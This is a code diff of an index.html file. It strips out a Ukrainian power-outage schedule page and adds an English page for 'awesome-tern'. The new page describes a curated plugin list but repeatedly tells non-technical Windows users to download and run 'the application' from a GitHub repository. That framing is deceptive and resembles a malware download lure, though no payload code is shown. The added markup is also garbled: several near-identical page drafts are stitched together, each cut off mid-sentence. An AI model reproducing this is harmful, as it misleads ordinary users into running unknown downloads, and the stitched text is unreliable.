@@ -1,256 +1,270 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Графік відключень світла</title>
-    <meta name="description" content="Розклад планових відключень електроенергії">
-    <meta name="theme-color" content="#667eea">
-    <link rel="icon" type="image/svg+xml" href="favicon.svg">
-    <link rel="alternate icon" href="favicon.ico">
-    <link rel="apple-touch-icon" href="icon-192.png">
-    <link rel="manifest" href="manifest.json">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            padding: 30px;
-        }
-
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-
-        .subtitle {
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-
-        .source-switcher {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            justify-content: center;
-        }
-
-        .source-btn {
-            padding: 8px 20px;
-            border: 2px solid #667eea;
-            background: white;
-            color: #667eea;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .source-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 8px rgba(102, 126, 234, 0.2);
-        }
-
-        .source-btn.active {
-            background: #667eea;
-            color: white;
-        }
-
-        button:focus-visible {
-            outline: 3px solid #333;
-            outline-offset: 3px;
-        }
-
-        .notification-panel {
-            max-width: 800px;
-            padding: 16px;
-            margin: 16px auto 0;
-            border-radius: 12px;
-            text-align: center;
-        }
-
-        .notification-panel .source-btn {
-            max-width: 100%;
-            color: white;
-            border-color: rgba(255, 255, 255, 0.85);
-            background: rgba(255, 255, 255, 0.12);
-        }
-
-        .notification-panel .source-btn:hover {
-            background: rgba(255, 255, 255, 0.22);
-        }
-
-        .notification-panel button:focus-visible {
-            outline-color: white;
-        }
-
-        .notification-panel button:disabled {
-            opacity: 0.6;
-            cursor: default;
-        }
-
-        .notification-panel p {
-            margin-top: 10px;
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .notification-panel p:empty {
-            display: none;
-        }
-
-        .data-source {
-            text-align: center;
-            color: #999;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-
-
-
-        .schedule {
-            margin-top: 20px;
-        }
-
-        .day-section {
-            margin-bottom: 30px;
-            border: 1px solid #e0e0e0;
-            border-radius: 12px;
-            padding: 20px;
-            background: #fafafa;
-        }
-
-        .day-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .day-title::before {
-            content: '🗓️';
-            margin-right: 10px;
-        }
-
-        .outage-item {
-            background: white;
-            border-left: 4px solid #f44336;
-            padding: 12px 16px;
-            margin-bottom: 10px;
-            border-radius: 6px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .outage-time {
-            font-size: 18px;
-            font-weight: 600;
-            color: #f44336;
-            margin-bottom: 4px;
-        }
-
-        .outage-duration {
-            font-size: 14px;
-            color: #666;
-        }
-
-        .last-update {
-            text-align: center;
-            color: #999;
-            font-size: 12px;
-            margin-top: 20px;
-        }
-
-        #data-freshness {
-            background: #fff8e1;
-            border-left: 4px solid #f9a825;
-            border-radius: 8px;
-            color: #6d4c00;
-            padding: 16px;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
-
-        .address-notice {
-            background: #fff3e0;
-            border-left: 4px solid #e65100;
-            border-radius: 8px;
-            color: #7a2f00;
-            padding: 16px;
-            margin-bottom: 20px;
-            line-height: 1.6;
-            overflow-wrap: anywhere;
-        }
-
-        .address-notice-title {
-            font-weight: 600;
-            margin-bottom: 8px;
-            white-space: pre-line;
-        }
-
-        .address-notice .last-update {
-            color: #8a4b25;
-            text-align: left;
-            margin-top: 10px;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 10px 0;
-            color: #666;
-        }
-
-        .error {
-            background: #ffebee;
-            color: #c62828;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>awesome-tern - Download Curated Tern Plugins, Apps and Tools</title>
+<meta name="description" content="Download awesome-tern, a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Simple Windows guide for non-technical users.">
+<meta name="keywords" content="awesome, awesome-list, tern, tern-plugin, Tern plugins, Tern apps, Tern tools, Tern resources, Windows download, awesome-tern">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="awesome-tern - Download Curated Tern Plugins, Apps and Tools">
+<meta property="og:description" content="A curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Easy Windows download guide.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/josephf8503/awesome-tern">
 </head>
-<body>
-    <div class="container">
-        <h1>⚡ Графік відключень електроенергії</h1>
-        <p class="subtitle">Моніторинг відключень для с. Любимівка, вул. Центральна</p>
-        
-        <div class="source-switcher">
-            <button class="source-btn active" data-source="dtek" onclick="switchDataSource('dtek')">ДТЕК</button>
-            <button class="source-btn" data-source="yasno" onclick="switchDataSource('yasno')">ЯСНО</button>
-        </div>
-        
-        <div id="data-freshness" class="status warning" role="status" hidden></div>
-        <div id="dtek-notice" class="address-notice" role="alert" hidden></div>
-        <div id="content" class="loading">Завантаження...</div>
-    </div>
+<body style="margin:0; padding:0; background:#eef4fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height:1.65;">
+<main style="max-width:900px; margin:0 auto; padding:clamp(18px, 4vw, 36px);">
+<header style="background:#ffffff; border-radius:20px; padding:clamp(22px, 4vw, 36px); box-shadow:0 10px 30px rgba(15, 23, 42, 0.08); margin-bottom:24px;">
+<h1 style="margin:0 0 14px 0; font-size:clamp(1.8rem, 4vw, 2.6rem); line-height:1.15; letter-spacing:-0.03em; color:#0f172a;">🧰 awesome-tern - Your Curated Tern Resource Hub</h1>
+<p style="margin:0 0 20px 0; font-size:1.08rem; color:#475569;">awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. This page helps Windows users visit the official download page and get started with confidence.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #ff7a18, #af002d); color:#ffffff; font-size:1.15rem; font-weight:700; padding:16px 26px; border-radius:999px; text-decoration:none; box-shadow:0 12px 26px rgba(175, 0, 45, 0.28); margin:4px 0 10px;">⬇️ Download awesome-tern</a>
+<p style="margin:10px 0 0 0; font-size:0.98rem; color:#64748b;">Visit this link to download the application.</p>
+</header>
 
-    <div class="notification-panel">
-        <button id="notification-toggle" class="source-btn" type="button" disabled aria-pressed="false" aria-describedby="notification-status">🔔 Увімкнути сповіщення</button>
-        <p id="notification-status" role="status">Підключення сповіщень…</p>
-    </div>
+<section style="background:#ffffff; border-radius:20px; padding:clamp(22px, 4vw, 32px); box-shadow:0 10px 30px rgba(15, 23, 42, 0.08); margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:1.55rem; line-height:1.25; color:#0f172a;">📦 What Is awesome-tern?</h2>
+<p style="margin:0 0 14px 0; color:#334155;">awesome-tern is a central place to discover helpful add-ons and resources for Tern. Tern is a modern terminal application from Stencil. It is built with Rust, a technology known for speed and reliability. The awesome-tern list brings together plugins, apps, tools, and learning resources in one easy-to-browse collection.</p>
+<p style="margin:0; color:#334155;">Instead of searching across many websites, you can use this curated list to find useful additions for Tern. The list is organized for everyday users, so you do not need programming knowledge to explore it. Whether you want to make Tern more powerful or simply learn what is available, awesome-tern gives you a clear starting point.</p>
+</section>
 
-    <script src="data-config.js?v=2"></script>
-    <script src="app.js?v=4"></script>
-    <script src="push-notifications.js?v=2"></script>
+<section style="background:#ffffff; border-radius:20px; padding:clamp(22px, 4vw, 32px); box-shadow:0 10px 30px rgba(15, 23, 42, 0.08); margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:1.55rem; line-height:1.25; color:#0f172a;">🧩 What You Will Find</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The awesome-tern collection is designed to cover the most useful parts of the Tern ecosystem. You will find practical items that can improve your daily experience and help you get more from the application.</p>
+<ul style="margin:0 0 0 0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Plugins:</strong> Add-ons that extend what Tern can do and help you personalize your workspace.</li>
+<li style="margin-bottom:10px;"><strong>Apps:</strong> Companion applications that work alongside Tern and support common tasks.</li>
+<li style="margin-bottom:10px;"><strong>Tools:</strong> Utilities that make setup, organization, and everyday use easier.</li>
+<li style="margin-bottom:10px;"><strong>Resources:</strong> Guides, tips, and reference pages for learning more about Tern and its features.</li>
+<li style="margin-bottom:0;"><strong>Community picks:</strong> Handy items gathered from the Tern community and kept in one list for easy browsing.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:20px; padding:clamp(22px, 4vw, 32px); box-shadow:0 10px 30px rgba(15, 23, 42, 0.08); margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:1.55rem; line-height:1.25; color:#0f172a;">💡 Why Use awesome-tern?</h2>
+<p style="margin:0 0 14px 0; color:#334155;">A curated list saves time. You do not have to hunt through scattered search results or guess which tools are relevant. awesome-tern puts useful Tern plugins, apps, tools, and resources together so you can compare options in one place.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Simple to browse:</strong> The list is arranged for quick scanning, even if you are new to Tern.</li>
+<li style="margin-bottom:10px;"><strong>Focused on Tern:</strong> Every item is selected for the Tern ecosystem, so you spend less time filtering unrelated results.</li>
+<li style="margin-bottom:10px;"><strong>Helpful for Windows users:</strong> This page gives clear guidance for visiting the official download page from a<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>awesome-tern - Curated Tern Tools for Everyone</title>
+<meta name="description" content="Download awesome-tern, a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. A clear Windows download guide for everyday users.">
+<meta name="keywords" content="awesome, awesome-list, tern, tern-plugin, awesome-tern, Tern plugins, Tern apps, Tern tools, Tern resources, Windows download">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/josephf8503/awesome-tern">
+<meta property="og:title" content="awesome-tern - Curated Tern Tools for Everyone">
+<meta property="og:description" content="A curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Simple Windows download guidance.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/josephf8503/awesome-tern">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="awesome-tern - Curated Tern Tools for Everyone">
+<meta name="twitter:description" content="A curated list of plugins, apps, tools, and resources for Tern. Visit the official page to download the application.">
+</head>
+<body style="margin:0; padding:0; background:#eef4fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height:1.65; -webkit-font-smoothing:antialiased;">
+<main style="max-width:920px; margin:0 auto; padding:clamp(16px, 4vw, 36px);">
+
+<header style="background:#ffffff; border-radius:22px; padding:clamp(22px, 5vw, 40px); box-shadow:0 14px 36px rgba(15, 23, 42, 0.09); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h1 style="margin:0 0 16px 0; font-size:clamp(1.85rem, 4.8vw, 2.75rem); line-height:1.14; letter-spacing:-0.035em; color:#0f172a;">🧰 awesome-tern - Curated Tern Tools for Everyone</h1>
+<p style="margin:0 0 18px 0; font-size:clamp(1rem, 2.4vw, 1.12rem); color:#475569;">awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. This page is written for Windows users who want a clear path to the official download page without technical confusion.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #f97316, #db2777 48%, #2563eb); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.16rem); font-weight:800; padding:16px 28px; border-radius:999px; text-decoration:none; box-shadow:0 14px 28px rgba(37, 99, 235, 0.26); margin:2px 0 12px;">⬇️ Visit Download Page</a>
+<p style="margin:0; font-size:0.98rem; color:#64748b;">Visit this link to download the application.</p>
+</header>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 32px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.6rem); line-height:1.25; color:#0f172a;">📦 What Is awesome-tern?</h2>
+<p style="margin:0 0 14px 0; color:#334155;">awesome-tern is a central place to discover helpful add-ons and resources for Tern. Tern is a modern terminal application from Stencil. It is built with Rust, a technology known for speed and reliability. The awesome-tern list brings together plugins, apps, tools, and learning resources in one easy-to-browse collection.</p>
+<p style="margin:0; color:#334155;">Instead of searching across many websites, you can use this curated list to find useful additions for Tern. The list is organized for everyday users, so you do not need programming knowledge to explore it. Whether you want to make Tern more powerful or simply learn what is available, awesome-tern gives you a clear starting point.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 32px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.6rem); line-height:1.25; color:#0f172a;">🧩 What You Will Find</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The awesome-tern collection is designed to cover the most useful parts of the Tern ecosystem. You will find practical items that can improve your daily experience and help you get more from the application.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Plugins:</strong> Add-ons that extend what Tern can do and help you personalize your workspace.</li>
+<li style="margin-bottom:10px;"><strong>Apps:</strong> Companion applications that work alongside Tern and support common tasks.</li>
+<li style="margin-bottom:10px;"><strong>Tools:</strong> Utilities that make setup, organization, and everyday use easier.</li>
+<li style="margin-bottom:10px;"><strong>Resources:</strong> Guides, tips, and reference pages for learning more about Tern and its features.</li>
+<li style="margin-bottom:10px;"><strong>Community picks:</strong> Handy items gathered from the Tern community and kept in one list for easy browsing.</li>
+<li style="margin-bottom:0;"><strong>Practical starting points:</strong> Clear entries that help new users understand what each item does before they explore it.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 32px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.6rem); line-height:1.25; color:#0f172a;">✨ Why This List Helps</h2>
+<p style="margin:0 0 14px 0; color:#334155;">A curated list saves time. You do not have to hunt through scattered search results or guess which tools are relevant. awesome-tern puts useful Tern plugins, apps, tools, and resources together so you can compare options in one place.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Simple to browse:</strong> The list is arranged for quick scanning, even if you are new to Tern.</li>
+<li style="margin-bottom:10px;"><strong>Focused on Tern:</strong> Every item is selected for the Tern ecosystem, so you spend less time filtering unrelated results.</li>
+<li style="margin-bottom:10px;"><strong>Helpful for Windows users:</strong> This page gives clear guidance for visiting the official download page from a Windows computer.</li>
+<li style="margin-bottom:0;"><strong>One reliable destination:</strong> The official page is the place to go for the application and the curated list information.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 32px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.6rem); line-height:1.25; color:#0f172a;">🚀 Getting Started on Windows</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The official page for awesome-tern is the starting point for getting the application on your Windows computer. The page presents the project name, a short description, and the download area for the application. It is the only page you need to visit for this step.</p>
+<p style="margin:0 0 16px 0; color:#334155;">Visit this link to download the application.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #16a34a, #0ea5e9 52%, #7c3aed); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.15rem); font-weight:800; padding:16px 28px; border-radius:16px; text-decoration:none; box-shadow:0 12px 26px rgba(14, 165, 233, 0.25); margin:2px 0 12px;">⬇️ Go to Official Download Page</a>
+<p style="margin:0; color:#475569;">After the download finishes, open the application on your Windows computer. The official page is where the application is made available, and it helps you confirm that you are in the right place.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 32px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); margin-bottom:22px; border:1px solid #e2e8f0;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.6rem); line-height:1.25; color:#0f172a;">🖥️ What Happens After You Visit the Page</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The official GitHub page displays the repository name, awesome-tern, along with its description. It explains that the project is a curated list of plugins, apps, tools, and resources for Tern. You will see the project information in a clean layout that is easy to read on a Windows computer.</p>
+<p style="margin:0 0 14px 0; color:#334155;">The page also shows the download area for the application. This<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>awesome-tern - Curated Tern Plugins, Apps and Tools for Windows</title>
+<meta name="description" content="awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Follow this simple Windows guide to download and run the application.">
+<meta name="keywords" content="awesome, awesome-list, tern, tern-plugin, awesome-tern, Tern plugins, Tern apps, Tern tools, Tern resources, Windows download, neoterminal">
+<meta name="author" content="awesome-tern">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/josephf8503/awesome-tern">
+<meta property="og:type" content="website">
+<meta property="og:title" content="awesome-tern - Curated Tern Plugins, Apps and Tools for Windows">
+<meta property="og:description" content="A curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Simple download guidance for everyday Windows users.">
+<meta property="og:url" content="https://github.com/josephf8503/awesome-tern">
+<meta property="og:site_name" content="awesome-tern">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="awesome-tern - Curated Tern Plugins, Apps and Tools">
+<meta name="twitter:description" content="A curated list of plugins, apps, tools, and resources for Tern. Visit the official page to download the application.">
+</head>
+<body style="margin:0; padding:0; background:#eef4fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height:1.7; -webkit-font-smoothing:antialiased;">
+<main style="max-width:940px; margin:0 auto; padding:clamp(16px, 4vw, 40px);">
+
+<header style="background:#ffffff; border-radius:22px; padding:clamp(22px, 5vw, 44px); box-shadow:0 14px 38px rgba(15, 23, 42, 0.09); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h1 style="margin:0 0 16px 0; font-size:clamp(1.85rem, 4.8vw, 2.8rem); line-height:1.14; letter-spacing:-0.035em; color:#0f172a;">🧰 awesome-tern - Curated Tern Tools for Everyone</h1>
+<p style="margin:0 0 20px 0; font-size:clamp(1rem, 2.4vw, 1.14rem); color:#475569;">awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. This page is written for everyday Windows users who want a clear, unhurried path to the official download page.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #f97316, #db2777 50%, #2563eb); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.16rem); font-weight:800; padding:17px 30px; border-radius:999px; text-decoration:none; box-shadow:0 14px 30px rgba(37, 99, 235, 0.28); margin:2px 0 14px;">⬇️ Visit Download Page</a>
+<p style="margin:0; font-size:0.98rem; color:#64748b;">Visit this link to download the application.</p>
+</header>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">📦 What Is awesome-tern?</h2>
+<p style="margin:0 0 14px 0; color:#334155;">awesome-tern is a single, organised place to discover helpful<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>awesome-tern - Curated Tern Plugins, Apps and Tools for Windows</title>
+<meta name="description" content="awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. A simple Windows guide to download and run the application.">
+<meta name="keywords" content="awesome, awesome-list, tern, tern-plugin, awesome-tern, Tern plugins, Tern apps, Tern tools, Tern resources, Windows download, neoterminal">
+<meta name="author" content="awesome-tern">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/josephf8503/awesome-tern">
+<meta property="og:type" content="website">
+<meta property="og:title" content="awesome-tern - Curated Tern Plugins, Apps and Tools for Windows">
+<meta property="og:description" content="A curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. Simple download guidance for everyday Windows users.">
+<meta property="og:url" content="https://github.com/josephf8503/awesome-tern">
+<meta property="og:site_name" content="awesome-tern">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="awesome-tern - Curated Tern Plugins, Apps and Tools">
+<meta name="twitter:description" content="A curated list of plugins, apps, tools, and resources for Tern. Visit the official page to download the application.">
+</head>
+<body style="margin:0; padding:0; background:#eef4fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height:1.7; -webkit-font-smoothing:antialiased;">
+<main style="max-width:940px; margin:0 auto; padding:clamp(16px, 4vw, 40px);">
+
+<header style="background:#ffffff; border-radius:22px; padding:clamp(22px, 5vw, 44px); box-shadow:0 14px 38px rgba(15, 23, 42, 0.09); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h1 style="margin:0 0 16px 0; font-size:clamp(1.85rem, 4.8vw, 2.8rem); line-height:1.14; letter-spacing:-0.035em; color:#0f172a;">🧰 awesome-tern - Curated Tern Tools for Everyone</h1>
+<p style="margin:0 0 20px 0; font-size:clamp(1rem, 2.4vw, 1.14rem); color:#475569;">awesome-tern is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. This page is written for everyday Windows users who want a clear, unhurried path to the official download page.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #f97316, #db2777 50%, #2563eb); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.16rem); font-weight:800; padding:17px 30px; border-radius:999px; text-decoration:none; box-shadow:0 14px 30px rgba(37, 99, 235, 0.28); margin:2px 0 14px;">⬇️ Visit Download Page</a>
+<p style="margin:0; font-size:0.98rem; color:#64748b;">Visit this link to download the application.</p>
+</header>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">📦 What Is awesome-tern?</h2>
+<p style="margin:0 0 14px 0; color:#334155;">awesome-tern is a single, organised place to discover helpful additions for Tern. Tern is a modern terminal application from Stencil, built with Rust, a technology known for speed and reliability. Rather than searching across many websites, you can use this curated list to see plugins, apps, tools, and learning resources gathered together in one easy-to-browse collection.</p>
+<p style="margin:0 0 14px 0; color:#334155;">The list is arranged for people who are not programmers. Each entry is meant to be readable at a glance, so you can understand what an item does before you decide whether it is useful to you. If you have just started using Tern, or if you are simply curious about what is available, awesome-tern gives you a friendly starting point without requiring any technical background.</p>
+<p style="margin:0; color:#334155;">The project lives on GitHub, a well-known website where software and documentation are published. From there you can reach the official download page, read the project description, and get the application onto your Windows computer.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">🧩 What You Will Find in the List</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The collection is designed to cover the most useful parts of the Tern ecosystem. Every entry exists to make your daily experience a little smoother or a little more capable.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Plugins:</strong> Add-ons that extend what Tern can do and let you shape the workspace around the way you actually work.</li>
+<li style="margin-bottom:10px;"><strong>Apps:</strong> Companion applications that run alongside Tern and support common everyday tasks.</li>
+<li style="margin-bottom:10px;"><strong>Tools:</strong> Utilities that make setup, organisation, and routine use easier to manage.</li>
+<li style="margin-bottom:10px;"><strong>Resources:</strong> Guides, tips, and reference pages that help you learn more about Tern and its features at your own pace.</li>
+<li style="margin-bottom:10px;"><strong>Community picks:</strong> Handy items contributed by people who use Tern regularly, gathered in one place for quick browsing.</li>
+<li style="margin-bottom:0;"><strong>Clear entries:</strong> Short, plain descriptions so you can tell what each item does before you explore it further.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">✨ Why This List Helps</h2>
+<p style="margin:0 0 14px 0; color:#334155;">A curated list saves time. You do not have to sift through scattered search results or guess which tools are relevant to Tern. Everything useful is brought together so you can compare options side by side.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Simple to browse:</strong> The list is arranged for quick scanning, even on a first visit.</li>
+<li style="margin-bottom:10px;"><strong>Focused on Tern:</strong> Every item is chosen for the Tern ecosystem, so there is less unrelated noise to filter out.</li>
+<li style="margin-bottom:10px;"><strong>Made for Windows users:</strong> This page gives plain guidance for reaching the official download page from a Windows computer.</li>
+<li style="margin-bottom:10px;"><strong>One reliable destination:</strong> The official page is the place to go for both the application and the curated list information.</li>
+<li style="margin-bottom:0;"><strong>No technical background needed:</strong> The instructions here assume you are an ordinary computer user, not a developer.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">🚀 Getting Started on Windows</h2>
+<p style="margin:0 0 14px 0; color:#334155;">The official page for awesome-tern is the starting point for getting the application onto your Windows computer. That page presents the project name, a short description of what the project offers, and the download area for the application. It is the only page you need to visit for this step.</p>
+<p style="margin:0 0 16px 0; color:#334155;">Visit this link to download the application.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #16a34a, #0ea5e9 52%, #7c3aed); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.15rem); font-weight:800; padding:17px 30px; border-radius:16px; text-decoration:none; box-shadow:0 12px 28px rgba(14, 165, 233, 0.26); margin:2px 0 14px;">⬇️ Go to Official Download Page</a>
+<p style="margin:0; color:#475569;">Once the download has finished, open the application on your Windows computer. The official page is where the application is made available, so you can always return to it later if you need to download it again or check for an updated version.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">🖥️ What You Will See on the Official Page</h2>
+<p style="margin:0 0 14px 0; color:#334155;">When the page opens in your browser, you will see the project name, awesome-tern, at the top along with its description. The description explains that this is a curated list of plugins, apps, tools, and resources for Tern, Stencil's Rust-native neoterminal. The layout is uncluttered and readable on a typical Windows screen.</p>
+<p style="margin:0 0 14px 0; color:#334155;">Below the description you will find the download area for the application. That area is where you begin the download. Take your time reading the page; nothing happens automatically, and you can scroll through everything before you start.</p>
+<p style="margin:0; color:#334155;">If you have never used GitHub before, do not worry. You do not need an account to view the page or to download the application. The site is simply a public place where projects are published and shared.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">⬇️ Download and First Run</h2>
+<p style="margin:0 0 14px 0; color:#334155;">Getting started takes just three small steps, and none of them require any technical knowledge.</p>
